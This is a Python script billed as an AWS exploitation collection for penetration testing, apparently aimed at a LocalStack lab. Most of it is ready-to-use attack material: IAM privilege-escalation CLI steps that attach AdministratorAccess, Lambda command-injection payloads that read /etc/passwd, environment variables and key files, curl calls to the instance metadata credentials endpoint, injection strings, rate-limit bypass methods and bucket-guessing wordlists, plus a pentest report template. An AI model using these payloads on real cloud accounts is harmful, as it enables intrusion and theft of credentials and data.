#!/usr/bin/env python3
"""
AWS Exploitation Scripts Collection
Specific exploitation techniques untuk AWS penetration testing
"""

import json
import base64
import hashlib
import hmac
from datetime import datetime
import urllib.parse

class AWSExploitationScripts:
    
    def __init__(self):
        self.endpoint = 'http://localhost:4566'
    
    def s3_bucket_finder(self, target_org):
        """
        S3 Bucket Discovery Script
        Mencari bucket S3 berdasarkan nama organisasi/target
        """
        print(f"🔍 S3 Bucket Discovery untuk: {target_org}")
        
        # Common bucket naming patterns
        patterns = [
            f"{target_org}",
            f"{target_org}-backup",
            f"{target_org}-logs",
            f"{target_org}-assets",
            f"{target_org}-data",
            f"{target_org}-config",
            f"{target_org}-prod",
            f"{target_org}-staging",
            f"{target_org}-dev",
            f"backup-{target_org}",
            f"logs-{target_org}",
            f"data-{target_org}",
            f"www-{target_org}",
            f"{target_org}.com",
            f"{target_org}.com-backup",
            f"{target_org}-www",
            f"{target_org}-web",
            f"{target_org}-website"
        ]
        
        print(f"Trying {len(patterns)} bucket name patterns...")
        
        found_buckets = []
        for pattern in patterns:
            # Simulate bucket enumeration
            print(f"Testing: {pattern}")
            # In real scenario, you would test actual bucket access
            found_buckets.append(pattern)
        
        return found_buckets
    
    def generate_iam_policy_bypass(self):
        """
        Generate IAM policy bypass techniques
        """
        bypass_techniques = {
            "privilege_escalation": {
                "description": "Create role with admin permissions",
                "policy": {
                    "Version": "2012-10-17",
                    "Statement": [
                        {
                            "Effect": "Allow",
                            "Action": "iam:CreateRole",
                            "Resource": "*"
                        },
                        {
                            "Effect": "Allow",
                            "Action": "iam:AttachRolePolicy",
                            "Resource": "*"
                        },
                        {
                            "Effect": "Allow",
                            "Action": "sts:AssumeRole",
                            "Resource": "*"
                        }
                    ]
                },
                "exploitation_steps": [
                    "1. Create new role: aws iam create-role --role-name EscalatedRole",
                    "2. Attach admin policy: aws iam attach-role-policy --role-name EscalatedRole --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
                    "3. Assume role: aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/EscalatedRole --role-session-name pwned"
                ]
            },
            
            "resource_based_bypass": {
                "description": "Bypass resource-based policies",
                "technique": "Cross-account resource access",
                "example": {
                    "s3_bucket_policy": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": "*",
                                "Action": "s3:GetObject",
                                "Resource": "arn:aws:s3:::target-bucket/*",
                                "Condition": {
                                    "StringEquals": {
                                        "aws:PrincipalAccount": "123456789012"
                                    }
                                }
                            }
                        ]
                    }
                }
            }
        }
        
        return bypass_techniques
    
    def lambda_payload_generators(self):
        """
        Generate various Lambda exploitation payloads
        """
        payloads = {
            "command_injection": {
                "description": "Command injection via event parameter",
                "payload": {
                    "command": "cat /proc/version; id; pwd; ls -la /tmp"
                },
                "curl_example": f"""
curl -X POST {self.endpoint}/2015-03-31/functions/vulnerable-function/invocations \\
-H "Content-Type: application/json" \\
-d '{{"command": "cat /etc/passwd"}}'
                """
            },
            
            "environment_disclosure": {
                "description": "Extract environment variables",
                "payload": {
                    "command": "env"
                },
                "expected_result": "Environment variables including API keys, secrets"
            },
            
            "file_system_exploration": {
                "description": "Explore file system",
                "payloads": [
                    {"command": "find / -name '*.key' -o -name '*.pem' -o -name '*secret*' 2>/dev/null"},
                    {"command": "ls -la /opt/"},
                    {"command": "cat /proc/self/environ"},
                    {"command": "mount"},
                    {"command": "df -h"}
                ]
            },
            
            "network_reconnaissance": {
                "description": "Network discovery from Lambda",
                "payloads": [
                    {"command": "curl -s http://169.254.169.254/latest/meta-data/"},
                    {"command": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
                    {"command": "netstat -tuln"},
                    {"command": "ss -tuln"}
                ]
            }
        }
        
        return payloads
    
    def dynamodb_injection_payloads(self):
        """
        Generate DynamoDB injection payloads
        """
        payloads = {
            "filter_expression_injection": {
                "description": "Inject into FilterExpression",
                "vulnerable_code": """
# VULNERABLE CODE
filter_expr = f"user_id = {user_input}"
response = table.scan(FilterExpression=filter_expr)
                """,
                "payloads": [
                    "1 OR attribute_exists(password)",
                    "1 OR contains(#data, 'secret')",
                    "1 OR begins_with(#key, 'admin')"
                ]
            },
            
            "condition_expression_bypass": {
                "description": "Bypass condition expressions",
                "example_payloads": [
                    {
                        "input": "admin' OR '1'='1",
                        "result": "May bypass authentication checks"
                    },
                    {
                        "input": "'; DROP TABLE users; --",
                        "result": "Won't work in DynamoDB but shows SQL injection mindset"
                    }
                ]
            }
        }
        
        return payloads
    
    def api_gateway_bypass_techniques(self):
        """
        API Gateway security bypass techniques
        """
        techniques = {
            "cors_misconfiguration": {
                "description": "Exploit CORS misconfiguration",
                "test_methods": [
                    "Send request with Origin: evil.com",
                    "Check Access-Control-Allow-Origin response",
                    "Test with null origin",
                    "Test with localhost origin variations"
                ],
                "curl_examples": [
                    f"curl -H 'Origin: http://evil.com' {self.endpoint}/api/endpoint",
                    f"curl -H 'Origin: null' {self.endpoint}/api/endpoint"
                ]
            },
            
            "authentication_bypass": {
                "description": "Bypass authentication mechanisms",
                "techniques": [
                    "JWT token manipulation",
                    "Missing authentication on OPTIONS requests",
                    "Case sensitivity bypass (/Admin vs /admin)",
                    "HTTP method override",
                    "Path traversal (../ encoding)"
                ]
            },
            
            "rate_limiting_bypass": {
                "description": "Bypass rate limiting",
                "methods": [
                    "IP rotation",
                    "X-Forwarded-For header manipulation",
                    "User-Agent rotation",
                    "Different HTTP methods",
                    "Case variations in endpoints"
                ]
            }
        }
        
        return techniques
    
    def cloudformation_injection_templates(self):
        """
        CloudFormation template injection examples
        """
        templates = {
            "parameter_injection": {
                "description": "Malicious parameter injection",
                "vulnerable_template": """
AWSTemplateFormatVersion: '2010-09-09'
Parameters:
  BucketName:
    Type: String
    Default: "my-bucket"

Resources:
  S3Bucket:
    Type: AWS::S3::Bucket
    Properties:
      BucketName: !Ref BucketName  # VULNERABLE
                """,
                "malicious_input": "my-bucket\\n  PublicAccessBlockConfiguration:\\n    BlockPublicAcls: false",
                "impact": "Can modify bucket configuration"
            },
            
            "resource_hijacking": {
                "description": "Hijack existing resources",
                "technique": "Reference existing resources with predictable names",
                "example": {
                    "malicious_parameter": "arn:aws:s3:::target-company-secrets",
                    "impact": "Access to sensitive buckets"
                }
            }
        }
        
        return templates
    
    def generate_wordlists(self):
        """
        Generate wordlists untuk AWS penetration testing
        """
        wordlists = {
            "s3_buckets": [
                # Common organizational patterns
                "backup", "backups", "data", "logs", "assets", "static",
                "uploads", "downloads", "files", "documents", "images",
                "videos", "config", "configuration", "settings",
                
                # Environment indicators
                "prod", "production", "staging", "stage", "dev", "development",
                "test", "testing", "qa", "demo", "sandbox",
                
                # Application types
                "web", "www", "api", "app", "mobile", "admin", "dashboard",
                "portal", "blog", "shop", "store", "cms",
                
                # Cloud-specific
                "aws", "s3", "bucket", "storage", "cdn", "cloudfront",
                
                # Security-related
                "private", "internal", "secure", "confidential", "restricted",
                "temp", "temporary", "cache", "tmp"
            ],
            
            "lambda_functions": [
                "api", "webhook", "processor", "handler", "worker",
                "auth", "authentication", "authorize", "login",
                "upload", "download", "resize", "convert",
                "email", "notification", "alert", "monitor",
                "backup", "cleanup", "maintenance", "cron"
            ],
            
            "iam_roles": [
                "admin", "administrator", "root", "super", "power",
                "service", "application", "app", "system",
                "lambda", "ec2", "s3", "rds", "api",
                "readonly", "read-only", "viewer", "guest"
            ]
        }
        
        return wordlists
    
    def generate_report_template(self):
        """
        Generate penetration testing report template
        """
        template = """
# AWS Penetration Testing Report

## Executive Summary
- **Test Date**: {date}
- **Target Environment**: AWS LocalStack
- **Scope**: All configured AWS services
- **Methodology**: OWASP Testing Guide, NIST Framework

## Findings Summary
| Severity | Count | Services Affected |
|----------|-------|-------------------|
| Critical | 0     | -                 |
| High     | 0     | -                 |
| Medium   | 0     | -                 |
| Low      | 0     | -                 |
| Info     | 0     | -                 |

## Detailed Findings

### F001: S3 Bucket Public Access
- **Severity**: High
- **Service**: Amazon S3
- **Description**: Bucket configured with public read access
- **Impact**: Sensitive data exposure
- **Recommendation**: Implement bucket policies with least privilege
- **References**: 
  - AWS S3 Security Best Practices
  - CWE-284: Improper Access Control

### F002: IAM Privilege Escalation Path
- **Severity**: Critical
- **Service**: AWS IAM
- **Description**: User can escalate to administrative privileges
- **Impact**: Full account compromise
- **Recommendation**: Review and restrict IAM permissions
- **References**:
  - AWS IAM Best Practices
  - CWE-269: Improper Privilege Management

### F003: Lambda Function Code Injection
- **Severity**: High
- **Service**: AWS Lambda
- **Description**: Function vulnerable to command injection
- **Impact**: Code execution, information disclosure
- **Recommendation**: Input validation and sanitization
- **References**:
  - OWASP Code Injection
  - CWE-78: OS Command Injection

## Remediation Roadmap

### Immediate (0-30 days)
- [ ] Remove public access from S3 buckets
- [ ] Review and restrict IAM permissions
- [ ] Fix Lambda code injection vulnerabilities

### Short-term (30-90 days)
- [ ] Implement CloudTrail logging
- [ ] Set up AWS Config rules
- [ ] Deploy GuardDuty

### Long-term (90+ days)
- [ ] Regular security assessments
- [ ] Security training for developers
- [ ] Automated security scanning in CI/CD

## Conclusion
The assessment identified several security vulnerabilities that require immediate attention. Implementing the recommended controls will significantly improve the security posture.

## References
- AWS Security Best Practices
- OWASP Top 10
- NIST Cybersecurity Framework
- CIS AWS Foundations Benchmark
        """.format(date=datetime.now().strftime('%Y-%m-%d'))
        
        return template

def main():
    exploits = AWSExploitationScripts()
    
    print("🔥 AWS Exploitation Scripts Collection")
    print("=====================================")
    
    print("\n1. S3 Bucket Discovery")
    buckets = exploits.s3_bucket_finder("acmecorp")
    print(f"Found {len(buckets)} potential bucket names")
    
    print("\n2. IAM Policy Bypass Techniques")
    iam_bypasses = exploits.generate_iam_policy_bypass()
    for technique, details in iam_bypasses.items():
        print(f"- {technique}: {details['description']}")
    
    print("\n3. Lambda Exploitation Payloads")
    lambda_payloads = exploits.lambda_payload_generators()
    for category, details in lambda_payloads.items():
        print(f"- {category}: {details['description']}")
    
    print("\n4. DynamoDB Injection Techniques")
    dynamo_payloads = exploits.dynamodb_injection_payloads()
    for technique, details in dynamo_payloads.items():
        print(f"- {technique}: {details['description']}")
    
    print("\n5. API Gateway Bypass Methods")
    api_bypasses = exploits.api_gateway_bypass_techniques()
    for method, details in api_bypasses.items():
        print(f"- {method}: {details['description']}")
    
    print("\n6. CloudFormation Injection")
    cf_injections = exploits.cloudformation_injection_templates()
    for injection, details in cf_injections.items():
        print(f"- {injection}: {details['description']}")
    
    print("\n7. Wordlists Generated")
    wordlists = exploits.generate_wordlists()
    for category, words in wordlists.items():
        print(f"- {category}: {len(words)} entries")
    
    print("\n✅ Exploitation scripts ready!")
    print("⚠️  Use only for authorized testing!")

if __name__ == "__main__":
    main()